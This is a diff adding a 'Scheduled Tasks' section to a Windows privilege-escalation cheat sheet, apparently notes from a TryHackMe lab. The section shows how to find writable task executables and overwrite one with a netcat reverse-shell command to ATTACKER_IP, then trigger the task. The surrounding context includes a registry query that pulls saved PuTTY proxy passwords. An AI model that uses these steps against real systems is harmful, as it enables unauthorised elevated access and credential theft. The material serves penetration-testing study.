@@ -5,6 +5,7 @@
 * [Saved Windows Credentials](#saved-windows-credentials)
 * [Internet Information Services Configuration](#internet-information-services-configuration)
 * [Retrieve Credentials from PuTTY](#retrieve-credentials-from-putty)
+* [Scheduled Tasks](#scheduled-tasks)
 
 *********************************************************************************
 Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
@@ -71,6 +72,33 @@ Search under the following registry key for ProxyPassword:
 ```
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
+
+********************************************
+
+## Scheduled Tasks
+
+List scheduled tasks with this command:
+```
+schtasks
+```
+* Look for "Task to Run" and "Run as User"
+* Look at file executable permissions with:
+```
+icacls [FILE-PATH]
+```
+* Look for (F) in BUILTIN\Users
+* Echo payload into file example:
+```
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+```
+* Start a listener on attack machine
+* Run the task:
+```
+schtasks /run /tn [TASK-NAME]
+```
+Check to see if the reverse shell connected
+
+********************************************
 
 ### Reference:
 * https://tryhackme.com/room/windowsprivesc20
